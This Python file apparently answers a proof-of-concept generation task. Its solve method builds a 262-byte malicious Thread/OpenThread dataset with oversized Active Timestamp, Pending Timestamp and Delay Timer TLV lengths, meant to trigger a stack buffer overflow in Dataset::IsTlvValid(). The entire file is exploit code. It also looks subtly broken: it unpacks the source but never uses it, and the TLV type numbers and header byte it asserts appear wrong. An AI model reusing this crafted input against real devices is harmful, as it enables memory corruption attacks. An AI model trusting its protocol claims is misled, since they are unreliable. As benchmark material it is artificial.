import os
import struct
import tempfile
import subprocess
import shutil
from pathlib import Path
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to analyze the source
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source
            shutil.unpack_archive(src_path, tmpdir)
            
            # Look for the vulnerable function pattern
            root_dir = Path(tmpdir)
            cpp_files = list(root_dir.rglob("*.cpp")) + list(root_dir.rglob("*.cc"))
            
            # Based on the vulnerability description:
            # The function doesn't validate minimum length for Active/Pending Timestamp
            # and Delay Timer TLVs in Dataset::IsTlvValid()
            
            # Typical TLV structure in Thread/OT stack:
            # - Type (1-2 bytes)
            # - Length (1-2 bytes)  
            # - Value (variable)
            
            # Create a minimal PoC that triggers stack buffer overflow
            # by providing invalid TLV lengths that cause buffer overread/overflow
            
            # Common TLV types in Thread datasets (based on OpenThread/Thread spec):
            # Active Timestamp TLV: Type 0x02, requires 8+ bytes
            # Pending Timestamp TLV: Type 0x03, requires 8+ bytes
            # Delay Timer TLV: Type 0x04, requires 4+ bytes
            
            # We'll create a dataset with TLVs that have length fields
            # larger than actual data, causing buffer overflow
            
            # Build malicious dataset:
            poc = bytearray()
            
            # Dataset header (simplified)
            # Active Operational Dataset
            poc.extend(b'\x01')  # Type: Active Dataset
            
            # Add Active Timestamp TLV with invalid length
            # Type: Active Timestamp (0x02)
            # Length: 0xFF (255) - much larger than actual data
            # Value: Only 8 bytes provided (should be 8 for timestamp)
            poc.extend(b'\x02')  # TLV Type: Active Timestamp
            poc.extend(b'\xFF')  # Length: 255 (invalid, should be 8)
            
            # Actual timestamp data (8 bytes)
            poc.extend(struct.pack('<Q', 0x1122334455667788))
            
            # Remaining bytes to reach ground-truth length of 262
            # The overflow happens when parsing tries to read 255 bytes
            # but we only provide minimal data, causing stack buffer overflow
            
            # Add more TLVs to reach target length and trigger various code paths
            
            # Pending Timestamp TLV with invalid length
            poc.extend(b'\x03')  # TLV Type: Pending Timestamp
            poc.extend(b'\xFE')  # Length: 254 (invalid)
            poc.extend(struct.pack('<Q', 0x8877665544332211))
            
            # Delay Timer TLV with invalid length
            poc.extend(b'\x04')  # TLV Type: Delay Timer
            poc.extend(b'\xFD')  # Length: 253 (invalid, should be 4)
            poc.extend(struct.pack('<I', 0x12345678))
            
            # Add Channel TLV (0x00) to exercise more code paths
            poc.extend(b'\x00')  # TLV Type: Channel
            poc.extend(b'\x03')  # Length: 3 (valid)
            poc.extend(b'\x0B\x5F\x00')  # Channel 11, Page 0
            
            # Add PAN ID TLV (0x05)
            poc.extend(b'\x05')  # TLV Type: PAN ID
            poc.extend(b'\x02')  # Length: 2 (valid)
            poc.extend(b'\xDE\xAD')  # PAN ID
            
            # Add Network Key TLV (0x08) with minimal data
            poc.extend(b'\x08')  # TLV Type: Network Key
            poc.extend(b'\x10')  # Length: 16 (valid for key)
            poc.extend(b'\x00' * 16)  # Zero key
            
            # Pad to exact 262 bytes (ground-truth length)
            current_len = len(poc)
            if current_len < 262:
                poc.extend(b'\xCC' * (262 - current_len))
            elif current_len > 262:
                poc = poc[:262]
            
            # Verify our PoC is exactly 262 bytes
            assert len(poc) == 262, f"PoC length is {len(poc)}, expected 262"
            
            return bytes(poc)
